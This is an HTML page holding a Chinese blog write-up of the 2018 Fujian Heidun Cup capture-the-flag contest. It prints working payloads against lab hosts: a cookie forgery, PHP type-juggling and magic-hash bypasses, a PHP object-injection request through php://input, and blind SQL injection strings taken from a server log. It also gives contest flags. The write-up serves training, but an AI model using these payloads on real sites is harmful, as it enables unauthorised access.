<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>福建省黑盾杯解题报告 | 闲言语</title><meta name=keywords content><meta name=description content="2018/9/16 福师大黑盾杯
信息泄露+代码审计 svn泄露源码：http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt
1 2 3 4 5 6 7 8 9 10 11 12 13 <?php error_reporting(0); $user = $_COOKIE['user']; $code = $_GET['code']?(int)$_GET['code']:''; if($user == 'admin' && !empty($code)) { $hex = (int)$code; if(($hex ^ 6789) === 0xCDEF) { require(&#34;flag.php&#34;); echo $flag; exit(); }	echo &#34;ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������&#34;; ?> GET 请求code=55146 ， 请求头添加Cookie: user=admin; 。
flag{a737c5c5b759c3705c8100accf65b5e4}
最好的语言 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 <?"><meta name=author content><link rel=canonical href=https://ret2neo.cn/post/180920-heidunbei/><link crossorigin=anonymous href=/assets/css/stylesheet.42b1e004fb78db2fc933d33c9db659598f62453f0de6f9db50c85e5936c0d8c3.css integrity="sha256-QrHgBPt42y/JM9M8nbZZWY9iRT8N5vnbUMheWTbA2MM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ret2neo.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ret2neo.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ret2neo.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://ret2neo.cn/apple-touch-icon.png><link rel=mask-icon href=https://ret2neo.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="福建省黑盾杯解题报告"><meta property="og:description" content="2018/9/16 福师大黑盾杯
信息泄露+代码审计 svn泄露源码：http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt
1 2 3 4 5 6 7 8 9 10 11 12 13 <?php error_reporting(0); $user = $_COOKIE['user']; $code = $_GET['code']?(int)$_GET['code']:''; if($user == 'admin' && !empty($code)) { $hex = (int)$code; if(($hex ^ 6789) === 0xCDEF) { require(&#34;flag.php&#34;); echo $flag; exit(); }	echo &#34;ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������&#34;; ?> GET 请求code=55146 ， 请求头添加Cookie: user=admin; 。
flag{a737c5c5b759c3705c8100accf65b5e4}
最好的语言 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 <?"><meta property="og:type" content="article"><meta property="og:url" content="https://ret2neo.cn/post/180920-heidunbei/"><meta property="article:section" content="post"><meta property="article:published_time" content="2018-09-20T14:07:27+08:00"><meta property="article:modified_time" content="2018-09-20T14:07:27+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="福建省黑盾杯解题报告"><meta name=twitter:description content="2018/9/16 福师大黑盾杯
信息泄露+代码审计 svn泄露源码：http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt
1 2 3 4 5 6 7 8 9 10 11 12 13 <?php error_reporting(0); $user = $_COOKIE['user']; $code = $_GET['code']?(int)$_GET['code']:''; if($user == 'admin' && !empty($code)) { $hex = (int)$code; if(($hex ^ 6789) === 0xCDEF) { require(&#34;flag.php&#34;); echo $flag; exit(); }	echo &#34;ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������&#34;; ?> GET 请求code=55146 ， 请求头添加Cookie: user=admin; 。
flag{a737c5c5b759c3705c8100accf65b5e4}
最好的语言 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 <?"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ret2neo.cn/post/"},{"@type":"ListItem","position":2,"name":"福建省黑盾杯解题报告","item":"https://ret2neo.cn/post/180920-heidunbei/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"福建省黑盾杯解题报告","name":"福建省黑盾杯解题报告","description":"2018/9/16 福师大黑盾杯\n信息泄露+代码审计 svn泄露源码：http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php error_reporting(0); $user = $_COOKIE[\u0026#39;user\u0026#39;]; $code = $_GET[\u0026#39;code\u0026#39;]?(int)$_GET[\u0026#39;code\u0026#39;]:\u0026#39;\u0026#39;; if($user == \u0026#39;admin\u0026#39; \u0026amp;\u0026amp; !empty($code)) { $hex = (int)$code; if(($hex ^ 6789) === 0xCDEF) { require(\u0026#34;flag.php\u0026#34;); echo $flag; exit(); }\techo \u0026#34;ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������\u0026#34;; ?\u0026gt; GET 请求code=55146 ， 请求头添加Cookie: user=admin; 。\nflag{a737c5c5b759c3705c8100accf65b5e4}\n最好的语言 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 \u0026lt;?","keywords":[],"articleBody":"2018/9/16 福师大黑盾杯\n信息泄露+代码审计 svn泄露源码：http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u003c?php error_reporting(0); $user = $_COOKIE['user']; $code = $_GET['code']?(int)$_GET['code']:''; if($user == 'admin' \u0026\u0026 !empty($code)) { $hex = (int)$code; if(($hex ^ 6789) === 0xCDEF) { require(\"flag.php\"); echo $flag; exit(); }\techo \"ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������\"; ?\u003e GET 请求code=55146 ， 请求头添加Cookie: user=admin; 。\nflag{a737c5c5b759c3705c8100accf65b5e4}\n最好的语言 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 \u003c?php show_source(__FILE__); $a=0; $b=0; $c=0; $d=0; if (isset($_GET['x1'])) //$x1=0;=\u003e$a=1; { $x1 = $_GET['x1']; $x1==\"1\"?die(\"ha?\"):NULL; switch ($x1) { case 0: case 1: $a=1; break; } } $x2=(array)json_decode(@$_GET['x2']); //$x2=json_encode(['x21'=\u003e'2018hello','x22'=\u003e[[],0]]) ; //string(32) \"{\"x21\":\"2018hello\",\"x22\":[[],0]}\" if(is_array($x2)){ is_numeric(@$x2[\"x21\"])?die(\"ha?\"):NULL; if(@$x2[\"x21\"]){ ($x2[\"x21\"]\u003e2017)?$b=1:NULL; } if(is_array(@$x2[\"x22\"])){ if(count($x2[\"x22\"])!==2 OR !is_array($x2[\"x22\"][0])) die(\"ha?\"); $p = array_search(\"XIPU\", $x2[\"x22\"]); //array_search — 在数组中搜索给定的值，如果成功则返回相应的键名 //mixed array_search( mixed $needle, array $haystack[, bool $strict = false] ) //第三个参数决定在搜索时是否比较类型，默认不比较，也是这里能够绕过的原因。 //var_dump(array_search('XIPU', array(\"0\",\"1\",0)));//int(2) //0==‘XIPU’为真，搜索到0值的下标为2 $p===false?die(\"ha?\"):NULL; foreach($x2[\"x22\"] as $key=\u003e$val){ $val===\"XIPU\"?die(\"ha?\"):NULL; } $c=1; } } $x3 = $_GET['x3']; if ($x3 != '15562') { if (strstr($x3, 'XIPU')) { if (substr(md5($x3),8,16) == substr(md5('15562'),8,16)) { //两个符合正则 /0e\\d+/ 的字符串弱相等。 // 爆破见下方python代码 $d=1; } } } if($a \u0026\u0026 $b \u0026\u0026 $c \u0026\u0026 $d){ include \"flag.php\"; echo $flag; } ?\u003e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 def brute(): for a in range(0x20, 0x7f): for b in range(0x20, 0x7f): for c in range(0x20, 0x7f): x = chr(a) + chr(b) + chr(c)+s mm=md5(x.encode('UTF-8')).hexdigest() flag=1 for i in mm[10:24]: if i not in '0123456789': flag=0 break if flag and mm[8:10]=='0e': print(x) brute() # kN[XIPU # v=|XIPU # y'wXIPU # }MOXIPU # ~VhXIPU ## http://192.168.200.200/web/bestlanguage/?x1=0\u0026x2={%22x21%22:%222018hello%22,%22x22%22:[[],0]}\u0026x3=~VhXIPU ## flag{510ea2879fa29d0d618b1f55350965c3} the user is admin 和 bugku 平台某个题目原理相似，因此没有保留源码。可以参考 该题 ，不赘述。\n1 2 3 4 5 /web/theuserisadmin/?file=class.php\u0026user=php://input\u0026pass=O:4:\"Read\":1:{s:4:\"file\";s:8:\"f1a9.php\";} post:the user is admin //flag{078d8dd8023d5716a11780adf344dfd2} ccgs 1 2 binwalk -e sgcc.png cat secret.txt | base64 -d | base64 -d \u003e final.png 注入日志分析 给了一个日志文件，file data.log得到是一个文本文件，直接打开，前几行是\n1 2 3 #Software: Microsoft Internet Information Services 6.0 #Version: 1.0 #Date: 2015-10-21 09:16:34 猜测是IIS服务器记录的流量日志， 分析前几行\n1 2 3 4 2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /index.htm - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0 2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /favicon.ico - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 404 0 2 2015-10-21 09:16:36 W3SVC1 192.168.1.135 GET /show.asp id=2 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0 2015-10-21 09:25:01 W3SVC1 192.168.1.135 GET /show.asp id=2%27|17|80040e14|字符串_''_之前有未闭合的引号。 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 500 0 0 可以看到就是一条条的HTTP请求，并且后面跟着状态码。继续浏览，看到id字段出现一些SQL的关键字，那么可以想到这记录的就是sqlmap(或许)的注入流量分析。思路就是找到关键的注入请求，文件很大，我们可以搜索flag试试，找到关键的请求如下\n1 2 3 4 ... 2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0 2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0 ... 可以利用文本编辑器如sublime text 3的ctrl+H的替换功能， 将关键流量进行精简并urldecode利于分析(截取两个代表性请求)\n1 2 id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))\u003e51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 500 0 0 id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))\u003e48 80 200 0 0 可以看到这里是二分法盲注的HTTP请求，现在思路很明确了， 从SUBSTRING(.*, 1, 1)开始找，并且只要看最后几条的注入请求就可以判断出字符是多少。 比如SUBSTRING(.*, 1, 1) \u003e 48的状态码是200，SUBSTRING(.*, 1, 1) \u003e 49的状态码是500，那其实就可以确定字符的ascii码是49。就这样就能得到theflag的值。\nbrightstar 列移位密码\n1 2 3 snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees key： howarey Columnar Transposition Cipher h o w a r e y 3 4 6 1 5 2 7 I t i s o f t e n i n t h e d a r k e s t s k i e s t h a t w e s e e b r i g h t e s t s t a r s 或者\n1 2 3 4 5 c='snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees'.split(' ') k='howarey' kk=sorted(k) print(''.join(c[kk.index(j)][i] for i in range(len(k)) for j in k)) # Itisofteninthedarkestskiesthatweseebrighteststars 这是啥呀 base32编码\n1 2 echo MZWGCZ33MM4GENJVHBRDSNJUGAYTSOBVGZTDAYRQGIZTINLEMMZTSNJVHBRX2=== | base32 -d #flag{c8b558b954019856f0b02345dc39558c} Windows逆向 1 2 3 4 5 6 7 s='sKfxEeft}f{gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\\0087138' flag='' idx=[1,4,14,10,5,36,23,42,13,19,28,13,27,39,48,41,42] for i in idx: flag+=s[i] print(flag) # KEY{e2s6ry3r5s8f6 得到部分flag，加上1024}得到完整flag：KEY{e2s6ry3r5s8f61024}\nreverseme 1 2 3 python -c \"open('file.png','wb').write(open('reverseme','rb').read()[::-1])\" 或 \u003creverseme xxd -p -c1 | tac | xxd -p -r \u003efile.png 1 convert -flop file.png mirror_file.png 下午 CMSeeK 扫出配置文件 http://192.168.200.202//configuration.php.txt\n底部有flag: flag{0b58f603ff55c0c190502b44b4ffbf2c}\n此外一些没进一步利用上的信息和部分题目的附件放在GiIthub ，有兴趣可移步查看。\n","wordCount":"662","inLanguage":"en","datePublished":"2018-09-20T14:07:27+08:00","dateModified":"2018-09-20T14:07:27+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2neo.cn/post/180920-heidunbei/"},"publisher":{"@type":"Organization","name":"闲言语","logo":{"@type":"ImageObject","url":"https://ret2neo.cn/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ret2neo.cn/ accesskey=h title="闲言语 (Alt + H)">闲言语</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ret2neo.cn/mind/ title=随笔><span>随笔</span></a></li><li><a href=https://ret2neo.cn/about title=关于><span>关于</span></a></li><li><a href=https://ret2neo.cn/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>福建省黑盾杯解题报告</h1><div class=post-meta><span title='2018-09-20 14:07:27 +0800 CST'>September 20, 2018</span>&nbsp;|&nbsp;<a href=https://github.dev/findneo/priblog/content/post/180920-heidunbei.md rel="noopener noreferrer" target=_blank>edit</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1 aria-label=信息泄露+代码审计>信息泄露+代码审计</a></li><li><a href=#%e6%9c%80%e5%a5%bd%e7%9a%84%e8%af%ad%e8%a8%80 aria-label=最好的语言>最好的语言</a></li><li><a href=#the-user-is-admin aria-label="the user is admin">the user is admin</a></li><li><a href=#ccgs aria-label=ccgs>ccgs</a></li><li><a href=#%e6%b3%a8%e5%85%a5%e6%97%a5%e5%bf%97%e5%88%86%e6%9e%90 aria-label=注入日志分析>注入日志分析</a></li><li><a href=#brightstar aria-label=brightstar>brightstar</a></li><li><a href=#%e8%bf%99%e6%98%af%e5%95%a5%e5%91%80 aria-label=这是啥呀>这是啥呀</a></li><li><a href=#windows%e9%80%86%e5%90%91 aria-label=Windows逆向>Windows逆向</a></li><li><a href=#reverseme aria-label=reverseme>reverseme</a></li><li><a href=#%e4%b8%8b%e5%8d%88 aria-label=下午>下午</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><p>2018/9/16 福师大黑盾杯</p><p><img loading=lazy src=95764a8abc472e176.png alt></p><h1 id=信息泄露代码审计>信息泄露+代码审计<a hidden class=anchor aria-hidden=true href=#信息泄露代码审计>#</a></h1><p>svn泄露源码：http://192.168.200.200/web/codeaudit/.svn/text-base/index.php.svn-base.txt</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-13>13</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>$user <span style=color:#f92672>=</span> $_COOKIE[<span style=color:#e6db74>&#39;user&#39;</span>];
</span></span><span style=display:flex><span>$code <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;code&#39;</span>]<span style=color:#f92672>?</span>(<span style=color:#a6e22e>int</span>)$_GET[<span style=color:#e6db74>&#39;code&#39;</span>]<span style=color:#f92672>:</span><span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($user <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;admin&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($code)) {
</span></span><span style=display:flex><span>	$hex <span style=color:#f92672>=</span> (<span style=color:#a6e22e>int</span>)$code;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(($hex <span style=color:#f92672>^</span> <span style=color:#ae81ff>6789</span>) <span style=color:#f92672>===</span> <span style=color:#ae81ff>0xCDEF</span>) {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>require</span>(<span style=color:#e6db74>&#34;flag.php&#34;</span>);
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>echo</span> $flag;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>	}	
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;ȱ��Ӧ�еĲ���,��û��Ȩ�޲鿴������&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></td></tr></table></div></div><p><code>GET</code> 请求<code>code=55146</code> ， 请求头添加<code>Cookie: user=admin;</code> 。</p><p><code>flag{a737c5c5b759c3705c8100accf65b5e4}</code></p><h1 id=最好的语言>最好的语言<a hidden class=anchor aria-hidden=true href=#最好的语言>#</a></h1><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-15>15</a>
